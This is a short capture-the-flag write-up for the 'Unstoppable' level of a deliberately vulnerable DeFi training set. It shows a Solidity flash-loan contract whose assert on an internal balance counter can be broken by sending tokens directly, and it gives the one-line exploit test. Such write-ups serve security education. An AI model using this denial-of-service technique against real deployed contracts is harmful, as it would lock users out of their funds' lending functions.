# 1 - Unstoppable

{% hint style="info" %}

{% endhint %}

We will break the `assert` statement.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // Ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore); // <- we will break here

    damnValuableToken.transfer(msg.sender, borrowAmount);

    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

```solidity
function depositTokens(uint256 amount) external nonReentrant {
    require(amount > 0, "Must deposit at least one token");
    // Transfer token from sender. Sender must have first approved them.
    damnValuableToken.transferFrom(msg.sender, address(this), amount);
    poolBalance = poolBalance + amount;
}
```

`depositTokens` function updates `poolBalance` if you deposited tokens by calling it.

But we can simply transfer tokens to **`UnstoppableLender`** contract by using ERC20 `transfer` function without using `depositTokens`.

## Solution

```javascript
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
```

